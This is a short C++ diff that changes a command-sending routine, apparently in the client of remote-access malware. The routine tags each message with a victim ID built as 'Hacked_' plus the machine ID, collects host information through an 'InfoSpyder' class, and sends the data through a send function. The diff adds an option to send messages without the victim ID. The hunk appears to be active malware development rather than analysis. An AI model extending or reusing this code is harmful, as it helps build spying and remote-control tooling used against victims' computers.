@@ -142,15 +142,23 @@ public:
         return fnSend(nCommand, nParam, vuBuffer);
     }
 
-    ssize_t fnSendCommand(const std::vector<std::string>& vsMsg)
+    ssize_t fnSendCommand(const std::vector<std::string>& vsMsg, bool bSendToSub = false)
     {
         clsInfoSpyder spyder;
         auto stInfo = spyder.m_info;
         m_szVictimID = "Hacked_" + stInfo.m_szMachineID;
 
         std::vector<std::string> vuSend;
-        vuSend.reserve(vsMsg.size() + 1);
-        vuSend.push_back(m_szVictimID);
+        if (bSendToSub)
+        {
+            vuSend.reserve(vsMsg.size());
+        }
+        else
+        {
+            vuSend.reserve(vsMsg.size() + 1);
+            vuSend.push_back(m_szVictimID);
+        }
+
         vuSend.insert(vuSend.end(), vsMsg.begin(), vsMsg.end());
 
         std::string szMsg = clsEZData::fnszSendParser(vuSend);
